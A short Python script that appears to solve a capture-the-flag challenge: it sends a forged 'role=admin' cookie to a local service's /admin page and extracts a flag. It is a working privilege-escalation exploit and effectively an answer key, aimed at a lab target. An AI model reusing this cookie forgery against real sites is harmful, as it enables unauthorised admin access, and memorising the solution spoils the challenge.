import re
import sys

import requests


def main():
    base = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost:8102"
    requests.get(base + "/", timeout=5)
    response = requests.get(base + "/admin", headers={"Cookie": "role=admin"}, timeout=5)
    flag = re.search(r"UNKNOWN\{[^}]+\}", response.text)
    if not flag:
        raise SystemExit("flag not found")
    print(flag.group(0))


if __name__ == "__main__":
    main()
